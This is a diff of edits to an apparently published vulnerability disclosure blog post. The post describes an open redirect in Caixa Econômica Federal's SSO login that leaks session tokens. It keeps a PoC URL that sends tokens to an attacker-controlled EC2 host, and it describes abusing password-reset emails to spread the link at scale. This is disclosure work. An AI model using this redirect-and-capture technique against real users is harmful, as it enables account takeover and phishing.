@@ -7,15 +7,13 @@ og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/ema
 
 ### Summary
 
-Recently I started to test the security of Web and Mobile Applications of some Brazilian Banks, I am not sure why this initiative really made me, maybe it's just the feeling of wanting to find more restricted vulnerabilities than common ones.
+I recently started to test the security of Web and Mobile Applications of some Brazilian banks that I use, I'm not sure why this initiative, maybe it's just the feeling of wanting to find more restricted vulnerabilities than the common ones. From that I found some vulnerabilities that surprised me somewhat, often being simple vulnerabilities that can be quickly fixed but have a significant impact.
 
-From that I found some vulnerabilities that surprised me somewhat, often being simple vulnerabilities that can be quickly fixed but have a significant impact.
-
-In this post I want to share with you an [“Open Redirect”](https://portswigger.net/kb/issues/00500100_open-redirection-reflected) that I found on the Caixa Econômica Federal website where I was able to leak the users' Session Token.
+In this post I want to share, an [“open redirect¹”](#references) that I found on the Caixa Econômica Federal website where I was able to leak the users' Session Token.
 
 It is worth clarifying that during all tests the only account used was mine and no other accounts or information from other users were accessed or violated during the development of this research/proof of concept.
 
-*Disclaimer:* the proof of concept of this vulnerability was made on January 01; The vulnerability was reported on january 05 and confirmation was made on january 07; On January 10, this vulnerability was corrected and on the same day this article was published.
+*Disclaimer:* the proof of concept of this vulnerability was made on January 01; The vulnerability was reported on january 05 and confirmation was made on january 07; On January 10, this vulnerability was corrected and on the same day  I publicated this article.
 
 ---
 
@@ -27,18 +25,14 @@ While browsing the web pages of the Caixa Federal systems, I came across an auth
 
 -
 
-This page is the authentication screen for access to the citizen portal panel and this caught my eye.
-
-I took a closer look at the URL structure of the page in question to understand a little more about the system, to my surprise there was a parameter that could probably lead me to find a vulnerability.
+This page is the authentication screen for access to the citizen portal panel and this caught my eye because I took a closer look at the URL structure of the page in question to understand a little more about the system, to my surprise there was a parameter that could probably lead me to find a vulnerability.
 
 The URL in question was as follows:
 
 [https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login)
 
 
-The last parameter of the URL was what drew attention to the potential vulnerability: **&redirect_uri=**
-
-The value entered in the parameter references to which URL the user will be redirected to when the user finishes the activity in question, which in this case is the login.
+The last parameter of the URL was what drew attention to the potential vulnerability: **&redirect_uri=**; The value entered in the parameter references to which URL the user will be redirected to when the user finishes the activity in question, which in this case is the login.
 
 In order to validate this theory, I changed the value of the **&redirect_uri=** parameter in the original URL to the Google homepage address, filled in my credentials, logged in, and the result was as follows:
 
@@ -87,9 +81,7 @@ app -> start();
 ```
 -
 
-This code is responsible for capturing and storing Session Tokens sent to the malicious URL under my control. In addition to capturing the Session Token and storing it in a log file, this script redirects the user once again, this time going to the true URL and having a genuine session on the Caixa Federal system. As such, it is unlikely that an ordinary user will know that he is being scammed.
-
-The malicious URL was as follows:
+This code is responsible for capturing and storing Session Tokens what are sent to the "malicious" URL under my control. In addition to capturing the Session Token and storing it in a log file, this script redirects the user once again, this time going to the true URL and having a genuine session on the Caixa Federal system. As such, it is unlikely that an ordinary user will know that he is being scammed. The PoC URL was as follows:
 
 [https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
 
@@ -107,7 +99,7 @@ The attack surface here is still somewhat restricted, requiring the user to ente
 
 Within minutes I could find a way to do this:
 
-On the same page, there is a function to request the password change, in the button “Register/Forgot Password”, where the user's email or social security number is requested. After filling in the information, a link to register the new password is sent. via email.
+On the same page, there is a function to request the password change, in the button “Register/Forgot Password”, where the user's email or Social Security Number is requested. After filling in the information, a link to register the new password is sent. via email.
 
 Asking for a new password from the malicious URL, the email content will be as follows:
 
@@ -115,9 +107,7 @@ Asking for a new password from the malicious URL, the email content will be as f
 
 -
 
-The email is sent by an official Caixa Federal system, however, if we look at the link, we can see that the URL is "infected" by the URL under my ownership.
-
-I accessed the link, filled in the password reset and again the redirection worked, along with that, the Session Token Leak also happened.
+The email is sent by an official Caixa Federal system, however, if we look at the link, we can see that the URL is "infected" by the URL under my ownership. I accessed the link, filled in the password reset and again the redirection worked, along with that, the Session Token Leak also happened.
 
 This way, I can use this mechanism to send emails requesting a password reset on behalf of Caixa Econômica Federal, creating greater reliability for the user to access my malicious link, and this attack can be performed on a large scale, since I only need the target's CPF (Social Security Number).
 
@@ -147,7 +137,7 @@ If an attacker exploits these vulnerabilities, he will be able to view some conf
 
 ### Conclusion
 
-A particular attacker could easily exploit the vulnerabilities mentioned above and thus violate the confidentiality of various legitimate user accounts by accessing confidential information and in some cases also violating the integrity of some specific information.
+An attacker could easily exploit the vulnerabilities mentioned above and thus violate the confidentiality of various legitimate user accounts by accessing confidential information and in some cases also violating the integrity of some specific information.
 
 The effort to perform this exploration is relatively small and simple, but the range of this attack is extremely large.
 
@@ -157,8 +147,8 @@ I strongly believe that this vulnerability was being exploited by malicious peop
 
 ### Referencies
 
-- [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
+- 1. [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
 
-- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
+- 2. [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
 
-- [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)
+- 3. [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)
